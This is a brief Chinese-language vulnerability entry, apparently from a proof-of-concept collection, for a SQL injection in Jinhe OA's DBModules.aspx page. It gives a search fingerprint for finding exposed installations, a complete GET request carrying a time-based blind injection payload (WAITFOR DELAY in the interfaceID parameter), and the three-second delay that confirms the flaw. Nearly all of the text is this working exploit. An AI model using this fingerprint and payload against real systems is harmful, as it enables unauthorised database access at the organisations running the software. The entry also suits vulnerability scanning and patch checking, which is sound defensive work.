# 金和OADBModules.aspxSQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=123;WAITFOR+DELAY+'0:0:3'-- HTTP/1.1`
- **响应特征**：200 响应时间>=3s